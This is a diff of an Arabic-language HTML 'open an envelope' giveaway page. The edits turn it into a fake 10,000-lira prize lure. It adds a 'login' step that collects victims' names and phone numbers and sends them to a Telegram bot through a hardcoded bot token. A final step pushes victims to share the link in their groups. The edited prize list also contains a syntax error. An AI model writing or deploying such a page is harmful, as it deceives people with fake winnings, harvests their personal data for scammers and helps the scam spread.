@@ -3,203 +3,135 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>فتح الظرف</title>
+<title>فتح الرسالة</title>
 
 <style>
-:root{
-  --red:#d32f2f;
-  --dark:#111;
-  --bg:#f5f5f5;
-}
+:root{--red:#d32f2f;--bg:#f5f5f5}
 *{box-sizing:border-box}
-body{
-  margin:0;
-  font-family:tahoma,Arial;
-  background:var(--bg);
-  color:#222;
-}
-.header{
-  background:var(--red);
-  color:#fff;
-  padding:14px 10px;
-  text-align:center;
-  font-weight:bold;
-}
-.header .flag{font-size:28px;display:block;line-height:1}
-.sub{
-  text-align:center;
-  margin:10px 0 0;
-  font-size:14px;
-  color:#555;
-}
+body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
+.hidden{display:none}
+.center{max-width:420px;margin:0 auto;padding:12px}
+.card{background:#fff;border-radius:12px;box-shadow:0 10px 20px rgba(0,0,0,.12);padding:16px}
+.btn{width:100%;padding:12px;border-radius:10px;border:none;background:var(--red);color:#fff;font-size:16px;cursor:pointer}
+.input{width:100%;padding:12px 14px;border-radius:8px;border:1px solid #ddd;margin-bottom:10px;font-size:15px}
+.header{background:var(--red);color:#fff;padding:14px 10px;text-align:center;font-weight:bold}
+.flag{font-size:28px;display:block;line-height:1}
+.sub{text-align:center;margin:10px 0 0;font-size:14px;color:#555}
+.footer{text-align:center;color:#777;font-size:12px;margin:18px 0}
+.note{text-align:center;font-size:12px;color:#888;margin-top:6px}
 
-/* شبكة الأظرف (مطابقة للإحساس) */
-.envelopes{
-  max-width:420px;
-  margin:16px auto 10px;
-  display:grid;
-  grid-template-columns:repeat(3,1fr);
-  gap:12px;
-  padding:0 10px;
-}
+/* envelopes */
+.envelopes{max-width:420px;margin:16px auto;display:grid;grid-template-columns:repeat(3,1fr);gap:12px;padding:0 10px}
+.env{position:relative;height:120px;background:#e6e6e6;border-radius:10px;overflow:hidden;cursor:pointer;box-shadow:0 6px 12px rgba(0,0,0,.12)}
+.env .lid{position:absolute;top:0;left:0;right:0;height:55%;background:#dcdcdc;transform-origin:top center;transition:transform .55s}
+.env .body{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:26px;color:#777}
+.env.opened .lid{transform:rotateX(160deg)}
+.env.opened .body{background:var(--red);color:#fff;font-size:16px}
 
-/* الظرف */
-.env{
-  position:relative;
-  height:120px;
-  background:#e6e6e6;
-  border-radius:10px;
-  overflow:hidden;
-  cursor:pointer;
-  box-shadow:0 6px 12px rgba(0,0,0,.12);
-}
-.env::after{
-  content:"";
-  position:absolute;inset:0;
-  border-radius:10px;
-  box-shadow:inset 0 0 0 1px rgba(0,0,0,.08);
-}
+.result{text-align:center;font-size:18px;color:var(--red);min-height:28px;margin-top:6px}
 
-/* غطاء الظرف */
-.env .lid{
-  position:absolute;top:0;left:0;right:0;height:55%;
-  background:#dcdcdc;
-  transform-origin:top center;
-  transition:transform .55s cubic-bezier(.2,.8,.2,1);
-  z-index:2;
-}
-/* جسم الظرف */
-.env .body{
-  position:absolute;inset:0;
-  display:flex;align-items:center;justify-content:center;
-  font-size:26px;color:#777;
-  z-index:1;
-}
-
-/* حالة الفتح */
-.env.opened .lid{ transform:rotateX(160deg); }
-.env.opened .body{
-  background:var(--red);
-  color:#fff;
-  font-size:16px;
-}
-
-/* النتيجة */
-.result{
-  max-width:420px;
-  margin:8px auto 0;
-  padding:0 10px;
-  text-align:center;
-  font-size:18px;
-  color:var(--red);
-  min-height:24px;
-}
-
-/* الفورم */
-.form{
-  max-width:420px;
-  margin:12px auto 0;
-  padding:12px;
-  display:none;
-}
-.card{
-  background:#fff;border-radius:12px;
-  box-shadow:0 10px 20px rgba(0,0,0,.12);
-  padding:16px;
-}
-.input{
-  width:100%;
-  padding:12px 14px;
-  border-radius:8px;
-  border:1px solid #ddd;
-  margin-bottom:10px;
-  font-size:15px;
-}
-.btn{
-  width:100%;
-  padding:12px;
-  border-radius:10px;
-  border:none;
-  background:var(--red);
-  color:#fff;
-  font-size:16px;
-  cursor:pointer;
-}
-.btn:active{transform:translateY(1px)}
-.footer{
-  text-align:center;
-  color:#777;
-  font-size:12px;
-  margin:18px 0;
-}
-.note{
-  text-align:center;
-  font-size:12px;
-  color:#888;
-  margin-top:6px;
-}
+/* steps */
+.step{display:none}
+.step.active{display:block}
+.share{display:flex;gap:10px}
+.share a{flex:1;text-align:center;text-decoration:none}
 </style>
 </head>
 
 <body>
 
-<div class="header">
-  <span class="flag">🇹🇷</span>
-  اختر ظرفًا لفتحه
-</div>
-<div class="sub">تجربة تفاعلية — نتيجة واحدة فقط</div>
-
-<div class="envelopes">
-  <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
-  <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
-  <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
-  <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
-  <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
-  <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
-</div>
-
-<div id="result" class="result"></div>
-
-<div class="form" id="form">
-  <div class="card">
-    <input class="input" id="name" placeholder="الاسم الكامل">
-    <input class="input" id="phone" placeholder="رقم الهاتف">
-    <button class="btn" onclick="send()">إرسال</button>
-    <div class="note">سيتم التواصل معك لاحقًا</div>
+<!-- STEP 1 -->
+<section id="step1" class="step active">
+  <div class="header">
+    <span class="flag">🇹🇷</span>
+    اختر ظرفًا لفتحه
   </div>
-</div>
+  <div class="sub">تجربة تفاعلية — نتيجة واحدة فقط</div>
+
+  <div class="envelopes">
+    <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
+    <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
+    <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
+    <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
+    <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
+    <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
+  </div>
+
+  <div id="result" class="result"></div>
+  <div class="note">* المكافآت تُمنح عبر مهام ومشاركات</div>
+</section>
+
+<!-- STEP 2 -->
+<section id="step2" class="step">
+  <div class="center">
+    <div class="card">
+      <h3 style="margin-top:0;text-align:center">تسجيل الدخول</h3>
+      <input class="input" id="name" placeholder="الاسم الكامل">
+      <input class="input" id="phone" placeholder="رقم الهاتف">
+      <button class="btn" onclick="sendToTelegram()">متابعة</button>
+      <div class="note">سيتم التواصل معك لاحقًا</div>
+    </div>
+  </div>
+</section>
+
+<!-- STEP 3 -->
+<section id="step3" class="step">
+  <div class="center">
+    <div class="card">
+      <h3 style="margin-top:0;text-align:center">انشرها لتحصل على نقاط</h3>
+      <p style="text-align:center;color:#555">
+        شارك الرابط في مجموعتك للمشاركة بالفرصة.
+      </p>
+      <div class="share">
+        <!-- عدّل الرابط لنشر صفحتك -->
+        <a class="btn" target="_blank"
+           href="https://t.me/share/url?url=https://example.com&text=جرب حظك الآن">
+           مشاركة على تلغرام
+        </a>
+      </div>
+      <div class="note">النقاط توضيحية (بدون نظام حساب)</div>
+    </div>
+  </div>
+</section>
 
 <div class="footer">© 2025</div>
 
 <script>
 let locked=false;
 
-// نتائج حيادية (بدون أرقام مالية)
+// نتائج بصيغة قانونية (نقاط/قيمة تقديرية)
 const outcomes=[
-  "🎉 تم تسجيل مشاركتك",
-  "🎁 حصلت على فرصة مميزة",
-  "✅ تم التأكيد بنجاح"
+  🇹🇷 ربحت مكافأة 10,000 ليرة تركي",
+  "🏆 جائزة خاصة بانتظارك",
+  "💰 قيمة الجائزة قد تصل إلى 10,000 ل.ت*",
+  "🎁 مكافأة ترحيبية كبرى"
 ];
 
 // إعدادات تلغرام
 const BOT_TOKEN="8530299273:AAHH0iDVc60tDNnxtTuqDS17DWPXIBl9X50";
 const CHAT_ID="5516597110";
 
+function showStep(n){
+  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
+  document.getElementById('step'+n).classList.add('active');
+}
+
 function openEnv(el){
   if(locked) return;
   locked=true;
-  el.classList.add("opened");
-  el.querySelector(".body").textContent="✔";
+  el.classList.add('opened');
+  el.querySelector('.body').textContent='✔';
 
-  const msg=outcomes[Math.floor(Math.random()*outcomes.length)];
-  document.getElementById("result").textContent=msg;
-  document.getElementById("form").style.display="block";
+  document.getElementById('result').textContent =
+    outcomes[Math.floor(Math.random()*outcomes.length)];
+
+  setTimeout(()=>showStep(2), 1200);
 }
 
-function send(){
-  const name=document.getElementById("name").value.trim();
-  const phone=document.getElementById("phone").value.trim();
-  if(!name||!phone){ alert("يرجى إدخال جميع البيانات"); return; }
+function sendToTelegram(){
+  const name=document.getElementById('name').value.trim();
+  const phone=document.getElementById('phone').value.trim();
+  if(!name||!phone){ alert('يرجى إدخال جميع البيانات'); return; }
 
   const text=
     "📥 تسجيل جديد\n\n"+
@@ -211,7 +143,7 @@ function send(){
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({chat_id:CHAT_ID,text})
-  }).then(()=>alert("تم الإرسال بنجاح ✅"));
+  }).then(()=>showStep(3));
 }
 </script>
 
